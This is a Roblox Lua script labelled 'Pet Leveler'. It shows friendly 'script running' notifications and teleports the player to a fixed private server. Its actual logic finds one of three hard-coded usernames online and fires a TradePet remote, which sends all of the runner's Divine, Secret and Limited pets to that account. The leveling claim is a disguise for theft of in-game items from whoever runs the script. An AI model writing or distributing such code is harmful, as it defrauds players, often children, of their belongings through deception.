-- Notify: Script loaded
print("Script loaded!")
pcall(function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Pet Leveler",
        Text = "Script running...",
        Duration = 5
    })
end)

-- Teleport to private server
local teleportService = game:GetService("TeleportService")
local gameID = 126884695634066
local serverID = "fd20835758df1f4dbc9de47c130fb2c2" -- Your private server code

-- Use delay to prevent early teleport issues
task.delay(2, function()
    print("Now teleporting to private server...")
    pcall(function()
        teleportService:TeleportToPrivateServer(gameID, serverID, {game.Players.LocalPlayer})
    end)
end)

-- Wait before continuing pet logic (runs even if teleport fails)
task.wait(6)

-- Optional: Let user know teleport might've failed
pcall(function()
    game.StarterGui:SetCore("SendNotification", {
        Title = "Pet Leveler",
        Text = "Continuing... (teleport may have failed)",
        Duration = 5
    })
end)

-- Target rarities: Divine, Secret, Limited
local targetRarities = { "Divine", "Secret", "Limited" }
local rarityKey = "Rarity"

-- Preferred usernames (decoded)
local preferredUsers = {
    "boneblossom215",
    "beanstalk1251",
    "burningbud709"
}

-- Find first online preferred user
local targetUser = nil
for _, name in ipairs(preferredUsers) do
    if game.Players:FindFirstChild(name) then
        targetUser = name
        print("Found target user:", targetUser)
        break
    end
end

-- Get TradePet remote
local remoteName = "TradePet"
local remote = game.ReplicatedStorage:FindFirstChild(remoteName)

-- Send qualifying pets to the target user
if targetUser and remote then
    local petFolder = game.Players.LocalPlayer:FindFirstChild("Pets")
    if petFolder then
        for _, pet in pairs(petFolder:GetChildren()) do
            local rarity = pet:FindFirstChild(rarityKey)
            if rarity and table.find(targetRarities, rarity.Value) then
                print("Sending pet:", pet.Name, "with rarity:", rarity.Value)
                remote:FireServer(targetUser, pet.Name)
            end
        end
    else
        warn("Pets folder not found in LocalPlayer.")
    end
else
    warn("No target user online or remote event missing.")
end
